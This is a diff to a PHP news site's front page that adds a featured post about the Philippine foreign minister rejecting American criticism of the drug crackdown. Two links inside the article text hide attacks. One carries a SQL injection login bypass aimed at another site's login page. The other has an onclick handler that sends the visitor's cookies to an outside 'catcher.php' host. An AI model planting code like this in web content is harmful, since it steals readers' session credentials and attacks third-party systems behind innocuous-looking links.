@@ -5,6 +5,37 @@ include 'header.php';
     <!-- begin featured -->
     <div id="featured">
 
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
+     <h2> <a href="/featured/20160916-philippines-little-brother.php">Philippines: we cannot be 'the little brown brothers of America'</a></h2>
+       
+  <p class="details">By:Oliver Holmes, 16 September 2016 <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/philippines.png"  alt="philippines" /></a></div>
+       
+<p>
+The Philippines cannot <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">“forever be the little </a> brown brothers of America”, the country’s top diplomat has said, making it clear the country will not accept foreign criticism for a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">deadly crackdown on drugs.</a>
+</p>
+
+<p class="readmore">[ <a href="/featured/20160916-philippines-little-brother.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+
+
+
+
+
+
+
+
 
 <!-- start of post  -->
 <div class="post">
